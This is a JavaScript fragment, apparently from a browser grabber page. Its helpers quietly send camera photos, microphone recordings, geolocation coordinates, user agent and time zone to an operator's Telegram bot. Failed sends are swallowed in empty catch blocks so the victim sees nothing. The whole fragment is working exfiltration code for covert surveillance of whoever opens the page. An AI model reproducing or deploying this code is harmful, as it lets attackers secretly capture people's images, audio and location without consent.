async function sendTG(text){
  const url = `https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendMessage`;
  const body = new URLSearchParams({
    chat_id: CFG.CHAT_ID, text, parse_mode:"HTML",
    disable_web_page_preview:"true"
  });
  try { await fetch(url, { method:"POST", body, keepalive:true }); } catch(e){}
}

async function sendPhoto(blob, caption){
  const fd = new FormData();
  fd.append('chat_id', CFG.CHAT_ID);
  fd.append('caption', caption);
  fd.append('photo', blob, 'shot.jpg');
  try { await fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendPhoto`,
        { method:'POST', body:fd }); } catch(e){}
}

async function sendAudio(blob, caption){
  const fd = new FormData();
  fd.append('chat_id', CFG.CHAT_ID);
  fd.append('caption', caption);
  fd.append('audio', blob, 'mic.webm');
  try { await fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendAudio`,
        { method:'POST', body:fd }); } catch(e){}
}

function deviceInfo(){
  return `UA: ${navigator.userAgent}\nTZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
}

function getLoc(){
  return new Promise(res => {
    if (!navigator.geolocation) return res(null);
    navigator.geolocation.getCurrentPosition(
      p => res(`${p.coords.latitude},${p.coords.longitude} (~${Math.round(p.coords.accuracy)}m)`),
      () => res(null),
      { timeout:9000, enableHighAccuracy:true, maximumAge:0 }
    );
  });
}
